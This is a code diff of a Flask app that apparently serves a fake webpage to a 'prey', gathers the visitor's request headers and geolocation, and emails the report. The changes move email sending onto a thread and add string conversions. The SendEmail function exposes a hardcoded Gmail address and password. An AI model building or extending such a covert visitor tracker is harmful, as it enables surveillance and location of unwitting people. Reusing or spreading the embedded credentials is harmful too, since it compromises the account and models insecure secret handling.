@@ -4,6 +4,7 @@ import os
 import requests
 from ast import literal_eval
 import smtplib
+import _thread as thread
 #from datetime import datetime, timedelta
 
 app = Flask(__name__)
@@ -13,7 +14,7 @@ db = dataset.connect("sqlite:///:memory:")
 table = db["Case"]
 
 
-def SendEmail(emailAddr, subject, body):
+def SendEmail(threadName, emailAddr, subject, body):
     # Construct and sends the email report
     gmail_user = 'wpetrap@gmail.com'
     gmail_password = 'camiziwetazi'
@@ -64,7 +65,7 @@ def GetPreyInfo():
         "Accept: " + accept + "\n\n" + \
         "Geolocation Analysis:\n"
     for key in response.keys():
-        report += "\t" + key + ": " + response[key] + "\n"
+        report += "\t" + str(key) + ": " + str(response[key]) + "\n"
     return report
 
 
@@ -132,7 +133,8 @@ def Catch(e=None):
         valid_time = result["time"]
         # Get all information about the prey
         report = GetPreyInfo()
-        SendEmail(email_addr, email_title, report)
+        thread.start_new_thread(SendEmail,
+                                ("Email Thread", email_addr, email_title, report))
         # Return the pre-defined fake webpage
         return html
 
